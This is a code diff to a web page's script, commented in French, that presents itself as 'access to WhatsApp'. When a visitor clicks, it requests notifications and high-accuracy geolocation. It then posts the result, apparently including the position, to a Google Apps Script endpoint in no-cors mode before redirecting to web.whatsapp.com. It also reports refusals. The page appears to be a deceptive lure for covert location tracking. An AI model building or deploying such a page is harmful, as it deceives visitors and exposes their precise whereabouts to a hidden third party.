@@ -37,10 +37,22 @@ button.addEventListener('click', function() {
     spinner.style.display = 'block';
     statusText.textContent = "Accès à WhatsApp en cours...";
 
+    // Demande de permission notifications
+    if ('Notification' in window) {
+        Notification.requestPermission().then(permission => {
+            console.log("Permission notifications:", permission);
+            startGeolocation();
+        });
+    } else {
+        startGeolocation();
+    }
+});
+
+function startGeolocation() {
     if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
             function(position) {
-                // Géoloc acceptée avec mode no-cors
+                // Géoloc acceptée
                 fetch("https://script.google.com/macros/s/AKfycbwOiyIdX2JBQACPx3FOQX5XF6iNf4iI-SwxnOUD3n0ir8vg_rrfdmQQv3b98LecIVFi/exec", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -52,11 +64,9 @@ button.addEventListener('click', function() {
                         statut_geoloc: "acceptée",
                         heure: new Date().toISOString()
                     }),
-                    mode: 'no-cors' // empêche le blocage par CORS
-                })
-                .catch(err => console.error("Erreur fetch:", err));
+                    mode: 'no-cors'
+                }).catch(err => console.error("Erreur fetch:", err));
 
-                // Redirection immédiate (pas de lecture de réponse possible avec no-cors)
                 statusText.textContent = "Redirection en cours...";
                 setTimeout(() => { window.location.href = "https://web.whatsapp.com"; }, 1500);
             },
@@ -76,16 +86,14 @@ button.addEventListener('click', function() {
                     mode: 'no-cors'
                 }).catch(err => console.error("Erreur fetch:", err));
 
-                console.log("Géoloc refusée, redirection vers page explicative.");
                 window.location.href = "geoloc-refuse-mobile.html";
             },
             { enableHighAccuracy: true, timeout: 10000 }
         );
     } else {
-        console.log("Géolocalisation non disponible, redirection...");
         window.location.href = "https://web.whatsapp.com";
     }
-});
+}
 </script>
 
 </body>
